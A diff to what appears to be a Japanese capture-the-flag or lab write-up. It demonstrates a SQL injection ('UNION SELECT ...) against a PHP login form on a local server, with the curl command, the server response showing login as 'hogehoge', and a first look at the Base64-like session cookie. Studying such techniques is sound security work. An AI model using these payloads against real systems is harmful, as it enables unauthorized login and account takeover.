@@ -74,3 +74,57 @@ else {
 ```sql
 SELECT username, enc_password from user WHERE username='{$username}'
 ```
+
+ここに、
+
+```sql
+'UNION SELECT 'hogehoge','hoge
+```
+
+を送り込んでやると
+
+```sql
+SELECT username, enc_password from user WHERE username=''UNION SELECT 'hogehoge','hoge'
+```
+
+という文が完成して、
+
+```plain
++----------+------+
+| hogehoge | hoge |
++----------+------+
+```
+というのが返ってくる。
+
+```plain
+$ curl -i -F "username='UNION SELECT 'hogehoge','hoge" -F "password=" http://localhost:10080
+HTTP/1.1 100 Continue
+
+HTTP/1.1 200 OK
+Date: Fri, 17 Nov 2017 02:15:24 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Set-Cookie: JSESSION=YToyOntzOjQ6Im5hbWUiO3M6ODoiaG9nZWhvZ2UiO3M6NzoiaXNhZG1pbiI7Tjt97kVYluAhjodZrAPgRb3AZg%3D%3D
+Vary: Accept-Encoding
+Content-Length: 139
+Content-Type: text/html; charset=UTF-8
+
+<!doctype html>
+<html>
+<head><title>Login</title></head>
+<body>
+Hello hogehoge
+<div><a href="logout.php">Log out</a></div>
+</body>
+</html>
+```
+
+`hogehoge`としてログインできる
+
+`%3D`は`=`なので、
+
+```plain
+JSESSION=YToyOntzOjQ6Im5hbWUiO3M6ODoiaG9nZWhvZ2UiO3M6NzoiaXNhZG1pbiI7Tjt97kVYluAhjodZrAPgRb3AZg==
+```
+
+これはBase64っぽい
+
